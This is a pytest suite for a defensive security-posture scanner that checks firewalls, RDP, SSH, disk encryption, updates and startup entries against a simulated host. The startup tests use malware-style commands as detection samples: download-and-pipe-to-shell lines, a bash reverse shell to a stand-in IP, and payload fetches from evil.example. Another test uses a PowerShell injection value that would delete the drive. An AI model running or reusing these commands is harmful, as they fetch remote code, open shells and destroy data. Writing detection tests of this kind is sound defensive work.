"""Posture checks, driven entirely by a fake context (no real commands, files or registry)."""
import fnmatch
import stat
from datetime import datetime

import pytest

from aegis.core.models import Severity
from aegis.platforms import OS
from aegis.posture import (
    CheckStatus,
    Listener,
    PostureCheck,
    PostureContext,
    default_checks,
    run_posture_checks,
)
from aegis.posture.base import CheckResult, PostureReport
from aegis.posture.checks import (
    AutoLogonCheck,
    DefenderRealtimeCheck,
    DiskEncryptionCheck,
    ExposedServicesCheck,
    FirewallEnabledCheck,
    RemoteDesktopCheck,
    SensitiveFilePermissionsCheck,
    SMBv1Check,
    SSHHardeningCheck,
    StartupProgramsCheck,
    SystemUpdatesCheck,
    UserAccountControlCheck,
    suspicious_reasons,
)
from aegis.response.command import RunResult

NOW = datetime(2026, 9, 15, 12, 0)


def make_ctx(os=OS.LINUX, commands=None, listeners=(), files=None, modes=None,
             registry=None, elevated=False, env=None, calls=None, registry_values=None):
    commands = commands or {}
    files = files or {}
    registry_values = registry_values or {}

    def runner(args, timeout):
        if calls is not None:
            calls.append(list(args))
        line = " ".join(args)
        for prefix, (rc, out) in commands.items():
            if line.startswith(prefix):
                return RunResult(rc, out.encode())
        raise FileNotFoundError(args[0])

    return PostureContext(
        os=os, elevated=elevated, runner=runner,
        listeners=lambda: list(listeners),
        read_text=files.get,
        stat_mode=(modes or {}).get,
        read_registry=lambda key, name: (registry or {}).get((key, name)),
        registry_values=lambda hive, key: registry_values.get((hive, key)),
        glob=lambda pattern: [p for p in files if fnmatch.fnmatch(p, pattern)],
        env=(env or {}).get,
        now=lambda: NOW,
    )


# --------------------------------------------------------------------------- #
# Firewall
# --------------------------------------------------------------------------- #
NETSH_ALL_ON = """
Domain Profile Settings:
----------------------------------------------------------------------
State                                 ON

Private Profile Settings:
----------------------------------------------------------------------
State                                 ON

Public Profile Settings:
----------------------------------------------------------------------
State                                 ON
Ok.
"""


def test_windows_firewall_all_on_passes():
    ctx = make_ctx(OS.WINDOWS, commands={"netsh advfirewall": (0, NETSH_ALL_ON)})
    result = FirewallEnabledCheck().run(ctx)
    assert result.status is CheckStatus.PASS
    assert "3 profiles" in result.summary
    assert result.remediation == ""


def test_windows_firewall_public_off_fails_and_names_profile():
    output = NETSH_ALL_ON.replace("ON\nOk.", "OFF\nOk.")
    ctx = make_ctx(OS.WINDOWS, commands={"netsh advfirewall": (0, output)})
    result = FirewallEnabledCheck().run(ctx)
    assert result.status is CheckStatus.FAIL
    assert "Public" in result.summary
    assert "netsh advfirewall set allprofiles state on" in result.remediation


def test_windows_firewall_unparseable_output_is_skipped_not_failed():
    ctx = make_ctx(OS.WINDOWS, commands={"netsh advfirewall": (0, "Status  EIN\n")})
    assert FirewallEnabledCheck().run(ctx).status is CheckStatus.SKIP


def test_windows_firewall_missing_netsh_is_skipped():
    assert FirewallEnabledCheck().run(make_ctx(OS.WINDOWS)).status is CheckStatus.SKIP


def test_macos_firewall_disabled_fails():
    ctx = make_ctx(OS.MACOS, commands={
        "/usr/libexec/ApplicationFirewall/socketfilterfw": (0, "Firewall is disabled. (State = 0)")})
    assert FirewallEnabledCheck().run(ctx).status is CheckStatus.FAIL


def test_linux_firewalld_running_passes():
    ctx = make_ctx(commands={"firewall-cmd --state": (0, "running\n")})
    assert FirewallEnabledCheck().run(ctx).status is CheckStatus.PASS


def test_linux_ufw_inactive_fails():
    ctx = make_ctx(commands={"ufw status": (0, "Status: inactive\n")})
    result = FirewallEnabledCheck().run(ctx)
    assert result.status is CheckStatus.FAIL
    assert "ufw allow OpenSSH" in result.remediation


def test_linux_empty_nft_ruleset_fails():
    ctx = make_ctx(commands={"nft list ruleset": (0, "")}, elevated=True)
    assert FirewallEnabledCheck().run(ctx).status is CheckStatus.FAIL


def test_linux_unreadable_firewall_without_root_is_skipped():
    assert FirewallEnabledCheck().run(make_ctx(elevated=False)).status is CheckStatus.SKIP


def test_linux_no_firewall_as_root_warns():
    assert FirewallEnabledCheck().run(make_ctx(elevated=True)).status is CheckStatus.WARN


# --------------------------------------------------------------------------- #
# Exposed services
# --------------------------------------------------------------------------- #
def test_redis_on_all_interfaces_fails():
    ctx = make_ctx(listeners=[Listener("0.0.0.0", 6379, "redis-server", 10)])
    result = ExposedServicesCheck().run(ctx)
    assert result.status is CheckStatus.FAIL
    assert "Redis" in result.details[0] and "all interfaces" in result.details[0]


def test_loopback_only_services_pass():
    ctx = make_ctx(listeners=[Listener("127.0.0.1", 6379, "redis-server"),
                              Listener("::1", 5432, "postgres")])
    assert ExposedServicesCheck().run(ctx).status is CheckStatus.PASS


def test_database_on_network_interface_warns_at_medium():
    ctx = make_ctx(listeners=[Listener("::", 3306, "mysqld")])
    result = ExposedServicesCheck().run(ctx)
    assert result.status is CheckStatus.WARN
    assert result.severity is Severity.MEDIUM


def test_smb_is_expected_on_windows_but_flagged_on_linux():
    smb = [Listener("0.0.0.0", 445, "System")]
    assert ExposedServicesCheck().run(make_ctx(OS.WINDOWS, listeners=smb)).status is CheckStatus.PASS
    assert ExposedServicesCheck().run(make_ctx(OS.LINUX, listeners=smb)).status is CheckStatus.WARN


def test_duplicate_ipv4_ipv6_sockets_are_reported_once():
    ctx = make_ctx(listeners=[Listener("0.0.0.0", 27017, "mongod"), Listener("::", 27017, "mongod")])
    assert len(ExposedServicesCheck().run(ctx).details) == 1


def test_no_listeners_is_skipped():
    assert ExposedServicesCheck().run(make_ctx()).status is CheckStatus.SKIP


# --------------------------------------------------------------------------- #
# Windows registry checks
# --------------------------------------------------------------------------- #
UAC = UserAccountControlCheck._KEY


@pytest.mark.parametrize(("registry", "expected"), [
    ({(UAC, "EnableLUA"): 0}, CheckStatus.FAIL),
    ({(UAC, "EnableLUA"): 1, (UAC, "ConsentPromptBehaviorAdmin"): 0}, CheckStatus.WARN),
    ({(UAC, "EnableLUA"): 1, (UAC, "ConsentPromptBehaviorAdmin"): 5}, CheckStatus.PASS),
    ({}, CheckStatus.SKIP),
])
def test_uac(registry, expected):
    assert UserAccountControlCheck().run(make_ctx(OS.WINDOWS, registry=registry)).status is expected


def test_rdp_disabled_passes():
    ctx = make_ctx(OS.WINDOWS, registry={(RemoteDesktopCheck._TS, "fDenyTSConnections"): 1})
    assert RemoteDesktopCheck().run(ctx).status is CheckStatus.PASS


def test_rdp_without_nla_fails_high():
    ctx = make_ctx(OS.WINDOWS, registry={
        (RemoteDesktopCheck._TS, "fDenyTSConnections"): 0,
        (RemoteDesktopCheck._RDP_TCP, "UserAuthentication"): 0,
    })
    result = RemoteDesktopCheck().run(ctx)
    assert result.status is CheckStatus.FAIL
    assert result.severity is Severity.HIGH


def test_rdp_with_nla_warns():
    ctx = make_ctx(OS.WINDOWS, registry={
        (RemoteDesktopCheck._TS, "fDenyTSConnections"): 0,
        (RemoteDesktopCheck._RDP_TCP, "UserAuthentication"): 1,
    })
    assert RemoteDesktopCheck().run(ctx).status is CheckStatus.WARN


def test_rdp_allowed_but_not_listening_passes():
    ctx = make_ctx(OS.WINDOWS, listeners=[Listener("0.0.0.0", 445, "System")],
                   registry={(RemoteDesktopCheck._TS, "fDenyTSConnections"): 0})
    result = RemoteDesktopCheck().run(ctx)
    assert result.status is CheckStatus.PASS
    assert "port 3389" in result.summary


def test_rdp_listening_on_a_custom_port_is_still_reported():
    ctx = make_ctx(OS.WINDOWS, listeners=[Listener("0.0.0.0", 50000, "svchost.exe")],
                   registry={(RemoteDesktopCheck._TS, "fDenyTSConnections"): 0,
                             (RemoteDesktopCheck._RDP_TCP, "PortNumber"): 50000,
                             (RemoteDesktopCheck._RDP_TCP, "UserAuthentication"): 1})
    assert RemoteDesktopCheck().run(ctx).status is CheckStatus.WARN


@pytest.mark.parametrize(("registry", "expected"), [
    ({(SMBv1Check._SERVER, "SMB1"): 1}, CheckStatus.FAIL),
    ({(SMBv1Check._CLIENT, "Start"): 2}, CheckStatus.WARN),
    ({(SMBv1Check._CLIENT, "Start"): 4}, CheckStatus.PASS),
    ({}, CheckStatus.PASS),
])
def test_smb1(registry, expected):
    assert SMBv1Check().run(make_ctx(OS.WINDOWS, registry=registry)).status is expected


@pytest.mark.parametrize(("registry", "expected"), [
    ({(AutoLogonCheck._KEY, "AutoAdminLogon"): "1",
      (AutoLogonCheck._KEY, "DefaultPassword"): "hunter2"}, CheckStatus.FAIL),
    ({(AutoLogonCheck._KEY, "AutoAdminLogon"): "1"}, CheckStatus.WARN),
    ({(AutoLogonCheck._KEY, "AutoAdminLogon"): "0"}, CheckStatus.PASS),
])
def test_autologon(registry, expected):
    assert AutoLogonCheck().run(make_ctx(OS.WINDOWS, registry=registry)).status is expected


@pytest.mark.parametrize(("output", "expected"), [
    ("True\r\n", CheckStatus.PASS),
    ("False\r\n", CheckStatus.FAIL),
    ("Get-MpComputerStatus : not recognised\r\n", CheckStatus.SKIP),
])
def test_defender(output, expected):
    ctx = make_ctx(OS.WINDOWS, commands={"powershell": (0, output)})
    assert DefenderRealtimeCheck().run(ctx).status is expected


# --------------------------------------------------------------------------- #
# Disk encryption
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(("value", "expected"), [
    ("1", CheckStatus.PASS), ("2", CheckStatus.FAIL), ("5", CheckStatus.WARN), ("", CheckStatus.SKIP),
])
def test_bitlocker(value, expected):
    ctx = make_ctx(OS.WINDOWS, commands={"powershell": (0, value)}, env={"SystemDrive": "D:"})
    assert DiskEncryptionCheck().run(ctx).status is expected


def test_bitlocker_drive_from_environment_cannot_inject_into_the_script():
    calls = []
    ctx = make_ctx(OS.WINDOWS, commands={"powershell": (0, "1")},
                   env={"SystemDrive": "C:'); Remove-Item -Recurse C:\\ ;('"}, calls=calls)
    DiskEncryptionCheck().run(ctx)
    script = calls[0][-1]
    assert "Remove-Item" not in script
    assert "NameSpace('C:')" in script


def test_filevault_off_fails():
    ctx = make_ctx(OS.MACOS, commands={"fdesetup status": (0, "FileVault is Off.\n")})
    assert DiskEncryptionCheck().run(ctx).status is CheckStatus.FAIL


def test_linux_luks_volume_passes():
    ctx = make_ctx(commands={"lsblk": (0, "disk\npart\ncrypt\nlvm\n")})
    assert DiskEncryptionCheck().run(ctx).status is CheckStatus.PASS


def test_linux_without_luks_warns():
    ctx = make_ctx(commands={"lsblk": (0, "disk\npart\n")})
    assert DiskEncryptionCheck().run(ctx).status is CheckStatus.WARN


# --------------------------------------------------------------------------- #
# SSH
# --------------------------------------------------------------------------- #
SSHD = SSHHardeningCheck.CONFIG


def test_ssh_root_login_fails():
    ctx = make_ctx(files={SSHD: "PermitRootLogin yes\nPasswordAuthentication no\n"})
    result = SSHHardeningCheck().run(ctx)
    assert result.status is CheckStatus.FAIL
    assert any("PermitRootLogin" in d for d in result.details)


def test_ssh_unset_password_authentication_warns_because_default_is_yes():
    ctx = make_ctx(files={SSHD: "PermitRootLogin no\n"})
    assert SSHHardeningCheck().run(ctx).status is CheckStatus.WARN


def test_ssh_first_value_wins_including_earlier_include():
    main = "Include /etc/ssh/sshd_config.d/*.conf\nPasswordAuthentication yes\nPermitRootLogin no\n"
    ctx = make_ctx(files={
        SSHD: main,
        "/etc/ssh/sshd_config.d/50-cloud.conf": "PasswordAuthentication no\n",
    })
    assert SSHHardeningCheck().run(ctx).status is CheckStatus.PASS


def test_ssh_match_block_does_not_affect_global_settings():
    config = ("PermitRootLogin no\nPasswordAuthentication=no\n"
              "Match Address 10.0.0.0/8\n    PermitRootLogin yes\n")
    assert SSHHardeningCheck().run(make_ctx(files={SSHD: config})).status is CheckStatus.PASS


def test_ssh_not_installed_is_skipped():
    assert SSHHardeningCheck().run(make_ctx()).status is CheckStatus.SKIP


# --------------------------------------------------------------------------- #
# File permissions
# --------------------------------------------------------------------------- #
def test_world_readable_shadow_fails():
    modes = {"/etc/passwd": stat.S_IFREG | 0o644, "/etc/shadow": stat.S_IFREG | 0o644}
    result = SensitiveFilePermissionsCheck().run(make_ctx(modes=modes))
    assert result.status is CheckStatus.FAIL
    assert "/etc/shadow" in result.details[0] and "644" in result.details[0]


def test_default_permissions_pass():
    modes = {"/etc/passwd": stat.S_IFREG | 0o644, "/etc/shadow": stat.S_IFREG | 0o640,
             "/etc/sudoers": stat.S_IFREG | 0o440}
    assert SensitiveFilePermissionsCheck().run(make_ctx(modes=modes)).status is CheckStatus.PASS


def test_uninspectable_files_are_skipped():
    assert SensitiveFilePermissionsCheck().run(make_ctx()).status is CheckStatus.SKIP


# --------------------------------------------------------------------------- #
# Report and runner
# --------------------------------------------------------------------------- #
def _result(status, severity):
    return CheckResult("X", "x", "c", status, severity, "s")


def test_score_and_grade():
    report = PostureReport([
        _result(CheckStatus.FAIL, Severity.HIGH),     # -15
        _result(CheckStatus.WARN, Severity.MEDIUM),   # -4
        _result(CheckStatus.PASS, Severity.CRITICAL),
        _result(CheckStatus.SKIP, Severity.CRITICAL),
    ])
    assert report.score == 81
    assert report.grade == "B"
    assert report.evaluated == 3
    assert len(report.failing(Severity.HIGH)) == 1
    assert report.failing(Severity.CRITICAL) == []
    assert report.to_dict()["counts"] == {"pass": 1, "warn": 1, "fail": 1, "skip": 1}


def test_score_never_goes_negative():
    report = PostureReport([_result(CheckStatus.FAIL, Severity.CRITICAL)] * 10)
    assert report.score == 0
    assert report.grade == "F"


def test_runner_only_runs_checks_for_the_current_platform():
    report = run_posture_checks(make_ctx(OS.LINUX))
    ids = {r.check_id for r in report.results}
    assert "POSTURE-SSH" in ids
    assert "POSTURE-UAC" not in ids
    assert report.platform == "linux"


def test_a_crashing_check_is_reported_as_skipped():
    class Broken(PostureCheck):
        check_id = "BROKEN"

        def run(self, ctx):
            raise RuntimeError("boom")

    report = run_posture_checks(make_ctx(), checks=[Broken()])
    assert report.results[0].status is CheckStatus.SKIP
    assert "boom" in report.results[0].summary


# --------------------------------------------------------------------------- #
# OS updates
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(("output", "expected"), [
    ("2026-09-01 KB5050001\r\n", CheckStatus.PASS),     # 14 days
    ("2026-07-20 KB5040001\r\n", CheckStatus.WARN),     # 57 days
    ("2026-06-01 KB5030001\r\n", CheckStatus.FAIL),     # 106 days
    ("Get-HotFix : access denied\r\n", CheckStatus.SKIP),
])
def test_windows_update_age(output, expected):
    ctx = make_ctx(OS.WINDOWS, commands={"powershell": (0, output)})
    result = SystemUpdatesCheck().run(ctx)
    assert result.status is expected
    if expected is not CheckStatus.SKIP:
        assert "KB50" in result.details[0]


APT_SECURITY = """Listing...
openssl/jammy-updates,jammy-security 3.0.2-0ubuntu1.18 amd64 [upgradable from: 3.0.2-0ubuntu1.15]
vim/jammy-updates 2:8.2.3995-1ubuntu2.19 amd64 [upgradable from: 2:8.2.3995-1ubuntu2.17]
"""
APT_NORMAL = "Listing...\nvim/jammy-updates 2:8.2 amd64 [upgradable from: 2:8.1]\n"


def test_apt_pending_security_updates_fail():
    result = SystemUpdatesCheck().run(make_ctx(commands={"apt list": (0, APT_SECURITY)}))
    assert result.status is CheckStatus.FAIL
    assert "openssl" in result.details[0]
    assert "unattended-upgrades" in result.remediation


def test_apt_non_security_updates_warn():
    result = SystemUpdatesCheck().run(make_ctx(commands={"apt list": (0, APT_NORMAL)}))
    assert result.status is CheckStatus.WARN
    assert result.severity is Severity.MEDIUM


def test_pending_restart_warns_even_when_packages_are_current():
    ctx = make_ctx(commands={"apt list": (0, "Listing...\n")},
                   files={"/var/run/reboot-required": "*** System restart required ***\n"})
    result = SystemUpdatesCheck().run(ctx)
    assert result.status is CheckStatus.WARN
    assert "restart" in result.summary


def test_apt_up_to_date_passes():
    ctx = make_ctx(commands={"apt list": (0, "Listing...\n")})
    assert SystemUpdatesCheck().run(ctx).status is CheckStatus.PASS


def test_dnf_updates_available_warn():
    ctx = make_ctx(commands={"dnf -C": (100, "\nkernel.x86_64  6.9.1  updates\nvim.x86_64  9.1  updates\n")})
    result = SystemUpdatesCheck().run(ctx)
    assert result.status is CheckStatus.WARN
    assert result.summary.startswith("2 ")


def test_no_package_manager_is_skipped():
    assert SystemUpdatesCheck().run(make_ctx()).status is CheckStatus.SKIP


# --------------------------------------------------------------------------- #
# Startup programs
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("command", [
    r"powershell.exe -NoP -W Hidden -Enc SQBFAFgA",
    r"C:\Users\bob\AppData\Local\Temp\svch0st.exe",
    r"%TEMP%\update.exe /silent",
    r"C:\Users\Public\helper.exe",
    r"mshta.exe https://evil.example/payload.hta",
    r"rundll32.exe javascript:..\mshtml,RunHTMLApplication http://evil.example/x",
    "*/5 * * * * root curl -fsSL http://evil.example/x.sh | bash",
    "@reboot wget -qO- http://evil.example/x | sudo sh",
    "* * * * * root bash -i >& /dev/tcp/203.0.113.5/4444 0>&1",
    "@reboot /tmp/.x/miner --background",
])
def test_malware_style_startup_commands_are_flagged(command):
    assert suspicious_reasons(command)


@pytest.mark.parametrize("command", [
    r"%windir%\system32\SecurityHealthSystray.exe",
    r'"C:\Program Files\Softdeluxe\Free Download Manager\fdm.exe" --hidden',
    r'"C:\Users\omipc\AppData\Local\Programs\Notion\Notion.exe" --open-at-login',
    r'"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window',
    "17 * * * * root cd / && run-parts --report /etc/cron.hourly",
    "0 3 * * * root /usr/bin/certbot renew --quiet",
])
def test_ordinary_startup_commands_are_not_flagged(command):
    assert suspicious_reasons(command) == []


RUN = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"


def test_windows_run_key_with_encoded_powershell_fails():
    ctx = make_ctx(OS.WINDOWS, registry_values={
        ("HKLM", RUN): {"SecurityHealth": r"%windir%\system32\SecurityHealthSystray.exe"},
        ("HKCU", RUN): {"Updater": "powershell -w hidden -enc SQBFAFgA"},
    })
    result = StartupProgramsCheck().run(ctx)
    assert result.status is CheckStatus.FAIL
    assert len(result.details) == 1
    assert "HKCU" in result.details[0] and "Updater" in result.details[0]


def test_clean_windows_run_keys_pass():
    ctx = make_ctx(OS.WINDOWS, registry_values={
        ("HKLM", RUN): {"SecurityHealth": r"%windir%\system32\SecurityHealthSystray.exe"},
    })
    result = StartupProgramsCheck().run(ctx)
    assert result.status is CheckStatus.PASS
    assert result.summary.startswith("1 ")


def test_unreadable_run_keys_are_skipped():
    assert StartupProgramsCheck().run(make_ctx(OS.WINDOWS)).status is CheckStatus.SKIP


def test_cron_ignores_comments_and_variables_but_flags_download_pipes():
    ctx = make_ctx(files={
        "/etc/crontab": "SHELL=/bin/sh\nPATH=/usr/bin\n# m h dom mon dow user command\n"
                        "17 * * * * root cd / && run-parts --report /etc/cron.hourly\n",
        "/etc/cron.d/sync": "*/10 * * * * root curl -s http://203.0.113.5/s.sh | sh\n",
    })
    result = StartupProgramsCheck().run(ctx)
    assert result.status is CheckStatus.FAIL
    assert result.details[0].startswith("/etc/cron.d/sync:")


def test_long_startup_commands_are_truncated_in_details():
    command = r"C:\Users\Public\x.exe " + "A" * 400
    ctx = make_ctx(OS.WINDOWS, registry_values={("HKCU", RUN): {"x": command}})
    detail = StartupProgramsCheck().run(ctx).details[0]
    assert detail.count("A") < 200 and "..." in detail


def test_check_text_is_ascii_for_any_console():
    for check in default_checks():
        assert (check.title + check.remediation + check.category).isascii(), check.check_id
